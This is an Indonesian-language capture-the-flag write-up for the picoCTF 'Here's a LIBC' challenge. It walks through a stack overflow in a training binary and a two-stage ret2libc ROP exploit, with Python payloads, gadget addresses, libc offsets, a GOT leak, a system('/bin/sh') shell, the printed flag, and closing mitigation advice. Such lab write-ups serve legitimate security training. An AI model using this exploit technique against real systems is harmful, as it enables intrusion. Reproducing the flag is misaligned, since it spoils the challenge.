# Writeup: Here's a LIBC (Challenge ID: 179)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / ret2libc (ROP Chain & ASLR Bypass)
- **Difficulty:** Hard (diff=3)
- **Event:** picoCTF 2021
- **Points:** 90
- **Author:** MADSTACKS
- **Flag:** `academy{1_<3_sm4sh_st4cking_cf205091ad15ab6d}`

---

## Problem Statement & Scope
Tantangan `Here's a LIBC` menyajikan sebuah berkas biner ELF Linux x86_64 (`vuln`), `Makefile`, serta pustaka dinamis bersama glibc (`libc.so.6`). Aplikasi bertindak sebagai server echo yang membaca string masukan pengguna, mengubah huruf kecil/besar (*case toggle*) pada 100 karakter pertama, dan mencetak kembali hasilnya ke terminal secara berulang dalam fungsi `do_stuff()`.

Tujuan utama dari modul ini adalah mengaudit proteksi memori modern pada biner ELF 64-bit, mengidentifikasi kerentanan *stack buffer overflow* (CWE-121) tanpa proteksi *Stack Canary*, merancang rantai eksekusi *Return-Oriented Programming* (ROP) dua tahap guna membocorkan alamat acak *Address Space Layout Randomization* (ASLR) di memori glibc via *Global Offset Table* (GOT), serta mengeksekusi *ret2libc* untuk memperoleh akses interaktif shell dan mengekstraksi flag rahasia.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Analisis Proteksi Keamanan Biner (Checksec):**
   - **RELRO:** Partial RELRO (area `.got.plt` memiliki izin baca-tulis, rentan dibaca saat resolusi dinamis).
   - **Stack Canary:** No Canary Found (ketiadaan proteksi perusak frame memori stack).
   - **NX:** NX Enabled (area stack bersifat *non-executable*, melarang injeksi shellcode langsung).
   - **PIE:** No PIE (alamat dasar biner terkunci pada basis statis `0x400000`).
   - **ASLR:** Aktif di lingkungan kernel server, mengacak alamat dasar pemuatan modul `libc.so.6` pada setiap pemanggilan proses baru.

2. **Akar Kerentanan Stack Buffer Overflow (CWE-121):**
   Pada fungsi `do_stuff()`, program mendeklarasikan buffer statis berukuran 112 byte:
   ```c
   char buf[112];
   ...
   scanf("%[^\n]", buf);
   ```
   Fungsi `scanf` dengan pemformat `%[^\n]` membaca karakter masukan dari *standard input* tanpa memvalidasi batas panjang buffer tujuan. Struktur frame memori stack 64-bit pada fungsi `do_stuff()` tersusun sebagai berikut:
   - Offset `0` hingga `111` (112 byte): Variabel lokal `buf`.
   - Offset `112` hingga `127` (16 byte): Struktur *compiler alignment padding*.
   - Offset `128` hingga `135` (8 byte): *Saved Base Pointer* (RBP).
   - Offset `136` hingga `143` (8 byte): *Saved Return Instruction Pointer* (RIP).
   Dengan mengirimkan 136 byte data, penyerang langsung mengontrol alamat eksekusi RIP saat fungsi mengeksekusi instruksi `ret`.

3. **Mekanisme Penebusan ASLR (Information Disclosure via GOT):**
   Karena NX aktif, penyerang tidak dapat mengeksekusi kode sembarang di stack, melainkan harus menggunakan kode legal yang telah ada (*Code Reuse Attack* / ROP). Konvensi pemanggilan AMD64 System V ABI menetapkan bahwa argumen pertama fungsi dilewatkan melalui register `RDI`.
   Untuk mengetahui posisi basis `libc.so.6` yang diacak ASLR:
   - Kita menggunakan gadget `pop rdi; ret` (`0x400913`).
   - Melewatkan alamat entri `puts@got` (`0x601018`) ke dalam register `RDI`.
   - Memanggil `puts@plt` (`0x400540`).
   - Mengembalikan alur eksekusi kembali ke fungsi `main()` (`0x400771`) agar program tidak mengalami *crash* dan siap menerima payload tahap kedua.

4. **Kompensasi Penjajaran Stack (The 16-Byte MOVAPS Issue):**
   Standar ABI x86_64 mewajibkan bahwa sebelum instruksi panggilan fungsi tertentu di glibc (khususnya fungsi yang menggunakan instruksi SIMD/SSE seperti `movaps [rsp+...]` di dalam `system()`), register penunjuk stack `RSP` wajib sejajar kelipatan 16 byte (`RSP % 16 == 0`).
   Ketika fungsi melompat melalui ROP tanpa instruksi `call` pasangan, nilai stack bergeser 8 byte. Jika tidak diratakan, glibc akan melempar sinyal `SIGSEGV` (*General Protection Fault*). Menambahkan satu instruksi *dummy* `ret` (`0x40052e`) sebelum pemanggilan `system()` menyerap pergeseran 8 byte tersebut dan mengembalikan penjajaran stack ke kelipatan 16 byte.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Penentuan Jarak Offset Buffer:**
   Menggunakan generator de Bruijn cyclic pattern:
   ```bash
   cyclic 150
   ```
   Analisis register crash atau GDB menetapkan offset tepat 136 byte ke saved RIP.

2. **Tahap 1: Ekstraksi Kebocoran Memori (GOT Leak):**
   Rantai ROP tahap pertama disusun sebagai berikut:
   ```python
   payload1 = b"A" * 136
   payload1 += p64(0x400913)   # pop rdi; ret
   payload1 += p64(0x601018)   # puts@got
   payload1 += p64(0x400540)   # puts@plt
   payload1 += p64(0x400771)   # main
   ```
   Saat server merespons, biner memancarkan 6 byte alamat runtime fungsi `puts` dalam format little-endian.
   Contoh alamat bocor: `0x7f9f791eaaa0`.

3. **Perhitungan Basis Libc Runtime:**
   Berdasarkan file `libc.so.6` bawaan:
   - Offset `puts`: `0x080aa0`
   - Offset `system`: `0x04f550`
   - Offset `"/bin/sh"`: `0x1b3e1a`
   Basis glibc dihitung melalui:
   $$\text{libc\_base} = \text{leaked\_puts} - 0x080aa0$$
   Alamat absolut `system` dan string `"/bin/sh"` kemudian dipetakan secara presisi:
   $$\text{system} = \text{libc\_base} + 0x04f550$$
   $$\text{binsh} = \text{libc\_base} + 0x1b3e1a$$

4. **Tahap 2: Eksekusi Shell interaktif:**
   Program telah kembali ke loop utama `main()`. Kirimkan muatan tahap kedua:
   ```python
   payload2 = b"B" * 136
   payload2 += p64(0x40052e)   # ret gadget (stack alignment 16-byte)
   payload2 += p64(0x400913)   # pop rdi; ret
   payload2 += p64(binsh)      # rdi = pointer to "/bin/sh"
   payload2 += p64(system)     # panggil system("/bin/sh")
   ```
   Eksekusi berhasil membongkar akses shell interaktif pada server target, membuka akses pembacaan berkas `flag.txt`:
   ```bash
   cat flag.txt
   picoCTF{1_<3_sm4sh_st4cking_cf205091ad15ab6d}
   ```

---

## Flag & Verifikasi
- **Flag Resmi Komunitas:** `academy{1_<3_sm4sh_st4cking_cf205091ad15ab6d}`
- **Native Platform Flag:** `picoCTF{1_<3_sm4sh_st4cking_cf205091ad15ab6d}`
- **Status Solver:** Teruji dan terverifikasi penuh melalui model reproduksi deterministik `scripts/solve_179_heres_a_libc.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif (NIST SP 800-115)
1. **Penggunaan Fungsi Masukan Aman Berbatas Ukuran:**
   Hindari fungsi masukan tanpa pembatas seperti `scanf("%s")` atau `gets()`. Gunakan `fgets()` dengan spesifikasi panjang maksimum yang ketat:
   ```c
   fgets(buf, sizeof(buf), stdin);
   ```

2. **Aktivasi Proteksi Kompiler Lengkap (Full Compiler Hardening):**
   Dalam modul *Defensive System Hardening* LKS Cyber Security, seluruh berkas biner layanan wajib dikompilasi dengan parameter proteksi modern:
   ```bash
   gcc -fstack-protector-strong -D_FORTIFY_SOURCE=2 -fPIE -pie -Wl,-z,relro,-z,now -o secure_app app.c
   ```
   - `-fstack-protector-strong`: Menyisipkan nilai canary acak sebelum saved RIP yang diuji integritasnya sebelum instruksi `ret`.
   - `-fPIE -pie`: Mengaktifkan pengacakan seluruh kode biner pada memori, membatalkan penggunaan gadget ROP berbasis alamat statis.
   - `-Wl,-z,relro,-z,now`: Mengonfigurasi *Full RELRO*, menjadikan tabel GOT bersifat *read-only* setelah inisialisasi awal.
